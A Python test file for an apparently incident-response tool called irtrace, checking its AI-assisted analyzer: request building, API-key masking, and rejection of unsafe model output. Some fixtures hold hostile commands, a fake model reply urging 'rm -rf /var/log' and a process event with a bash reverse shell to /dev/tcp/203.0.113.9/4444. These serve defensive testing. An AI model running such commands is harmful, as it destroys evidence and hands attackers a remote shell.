"""AI 辅助检测：协议拼装、配置掩码，以及「没有真实模型返回就不产结论」。

不在这里打真实模型。真实调用由手工执行 `irtrace ai check` 验证。
"""

from __future__ import annotations

import json

from irtrace.ai.client import ModelClient, ModelConfig, ModelError, _chat_url, load_model_config
from irtrace.analyzers.ai_assist import AIAssistAnalyzer
from irtrace.core.context import RunContext
from irtrace.core.models import Category, Event
from irtrace.secrets import SecretStore


def test_chat_url_accepts_root_v1_and_full_path():
    assert _chat_url("https://api.example.com") == "https://api.example.com/v1/chat/completions"
    assert _chat_url("https://api.example.com/v1") == "https://api.example.com/v1/chat/completions"
    assert _chat_url("https://api.example.com/v1/chat/completions") == (
        "https://api.example.com/v1/chat/completions"
    )


def test_openai_request_uses_bearer_and_returns_content(monkeypatch):
    captured = {}

    def fake_request(url, **kwargs):
        captured["url"] = url
        captured.update(kwargs)
        return 200, {"choices": [{"message": {"content": '{"compromised": false}'}}]}, None

    monkeypatch.setattr("irtrace.ai.client.request_json", fake_request)
    client = ModelClient(ModelConfig(
        base_url="https://api.example.com/v1", api_key="sk-test-secret", model="demo",
    ))
    assert client.complete_json("sys", "user") == {"compromised": False}
    assert captured["url"].endswith("/chat/completions")
    assert captured["headers"]["Authorization"] == "Bearer sk-test-secret"
    body = captured["json_body"]
    assert body["model"] == "demo"
    assert body["messages"][0]["role"] == "system"


def test_unparseable_model_output_is_an_error(monkeypatch):
    monkeypatch.setattr(
        "irtrace.ai.client.request_json",
        lambda *a, **k: (200, {"choices": [{"message": {"content": "不是 json"}}]}, None),
    )
    client = ModelClient(ModelConfig(base_url="https://h/v1", api_key="k", model="m"))
    try:
        client.complete_json("s", "u")
    except ModelError:
        return
    raise AssertionError("无法解析时必须失败，不能编造结果")


def test_model_config_roundtrip_does_not_echo_key(workspace, capsys):
    from irtrace.cli import main

    code = main([
        "-w", str(workspace), "ai", "set",
        "--base-url", "https://api.example.com/v1",
        "--model", "demo-model", "--api-key", "sk-live-secret-1234",
    ])
    assert code == 0
    stored = SecretStore(workspace).get("ai_model")
    assert stored["api_key"] == "sk-live-secret-1234"
    assert stored["extra"]["model"] == "demo-model"
    config = load_model_config(workspace)
    assert config.configured
    assert config.model == "demo-model"

    assert main(["-w", str(workspace), "ai", "status"]) == 0
    out = capsys.readouterr().out
    assert "sk-live-secret-1234" not in out
    assert "demo-model" in out


def test_analyzer_skips_when_model_is_not_configured(workspace):
    ctx = RunContext(workspace, persistent=False)
    ctx.add_event(Event(
        timestamp=None, category=Category.NETWORK, source="t",
        action="external_connection", dst_ip="203.0.113.9",
        message="外联 203.0.113.9",
    ))
    assert AIAssistAnalyzer().analyze(ctx) == []
    assert ctx.stats["ai_assist"]["status"] == "skipped"


def test_delete_instruction_is_discarded(workspace, monkeypatch):
    SecretStore(workspace).set("ai_model", "sk-test", extra={
        "protocol": "openai", "base_url": "https://api.example.com/v1",
        "model": "demo", "timeout": 5,
    })

    def fake_complete(self, system, user):
        assert "禁止删除" in system
        assert "不得要求读取材料以外的文件" in system
        return {
            "intrusion_points": [{"claim": "先删除再看", "evidence_ids": ["E1"]}],
            "sources": ["local_rules"], "readonly": False,
            "summary": "先 rm -rf /var/log 再判定",
        }

    monkeypatch.setattr(ModelClient, "complete_json", fake_complete)
    ctx = RunContext(workspace, persistent=False)
    ctx.add_event(Event(
        timestamp=None, category=Category.NETWORK, source="t",
        action="external_connection", dst_ip="45.155.205.233",
        message="外联 45.155.205.233",
    ))
    assert AIAssistAnalyzer().analyze(ctx) == []
    assert ctx.stats["ai_assist"]["status"] == "rejected"


def test_analyzer_keeps_real_intel_payload(workspace, monkeypatch):
    SecretStore(workspace).set("ai_model", "sk-test", extra={
        "protocol": "openai", "base_url": "https://api.example.com/v1",
        "model": "demo", "timeout": 5,
    })
    seen = {}

    def fake_complete(self, system, user):
        seen["user"] = user
        material = json.loads(user[user.find("{"):])
        assert material["intel"], "必须把带编号的情报查询结果交给模型"
        assert "intel_reports" not in material
        intel_ids = [item["id"] for item in material["intel"] if item["malicious"]]
        return {
            "intrusion_points": [{
                "claim": "情报命中该 IP",
                "evidence_ids": intel_ids[:1] or ["E1"],
            }],
            "summary": "情报命中",
            "sources": ["local_rules"],
            "readonly": True,
        }

    monkeypatch.setattr(ModelClient, "complete_json", fake_complete)
    ctx = RunContext(workspace, persistent=False)
    ctx.add_event(Event(
        timestamp=None, category=Category.NETWORK, source="t",
        action="external_connection", dst_ip="45.155.205.233",
        message="外联 45.155.205.233",
    ))
    findings = AIAssistAnalyzer().analyze(ctx)
    assert len(findings) == 1
    # 只有本地情报命中、没有主机入侵动作：可疑，不算失陷。
    assert findings[0].details["compromised"] is False
    assert findings[0].details["stage"] == "suspicious"
    assert findings[0].details["online"] is False
    assert "仅有本地情报" in findings[0].description
    assert "45.155.205.233" in seen["user"]


def test_online_hit_plus_host_action_is_compromised(workspace, monkeypatch):
    """在线情报是否恶意由查询结果决定；主机动作必须被模型引用才计入。"""
    SecretStore(workspace).set("ai_model", "sk-test", extra={
        "protocol": "openai", "base_url": "https://api.example.com/v1",
        "model": "demo", "timeout": 5,
    })

    class _Verdict:
        def __init__(self):
            self.payload = {
                "provider": "public_feeds", "malicious": True, "score": 70.0,
                "description": "spamhaus-drop 收录", "error": None,
                "raw": {"hits": [{"line": "203.0.113.0/24", "url": "https://example.invalid/drop"}]},
            }

        def to_dict(self):
            return self.payload

    class _Report:
        def to_dict(self):
            return {"indicator": "203.0.113.9", "verdicts": [_Verdict().to_dict()]}

    class _Aggregator:
        @classmethod
        def from_config(cls, cfg, ctx=None):
            assert "public_feeds" not in (cfg.get("providers") or [])
            assert "abuseipdb" in cfg.get("providers")
            return cls()

        def lookup(self, indicator, itype):
            return _Report()

    monkeypatch.setattr("irtrace.analyzers.ai_assist.IntelAggregator", _Aggregator)

    def fake_complete(self, system, user):
        material = json.loads(user[user.find("{"):])
        assert any(item["provider"] == "public_feeds" and item["malicious"]
                   for item in material["intel"])
        return {
            "intrusion_points": [{
                "claim": "进程出现反弹 shell 特征",
                "evidence_ids": ["E1"],
            }],
            "summary": "主机有执行动作，在线列表收录了对端",
            "sources": ["public_feeds"],
            "readonly": True,
        }

    monkeypatch.setattr(ModelClient, "complete_json", fake_complete)
    ctx = RunContext(workspace, persistent=False)
    SecretStore(workspace).set("abuseipdb", "test-key", enabled=True)
    ctx.config["ai"] = {"enabled": True, "cross_validate": True}
    ctx.add_event(Event(
        timestamp=None, category=Category.PROCESS, source="t",
        action="process_suspicious", dst_ip="203.0.113.9",
        message="bash -i >& /dev/tcp/203.0.113.9/4444",
        tags=["reverse_shell_pattern"],
    ))
    findings = AIAssistAnalyzer().analyze(ctx)
    assert len(findings) == 1
    assert findings[0].details["compromised"] is True
    assert findings[0].details["stage"] == "compromised"
    assert findings[0].details["online"] is True
    assert "仅有本地情报" not in findings[0].description
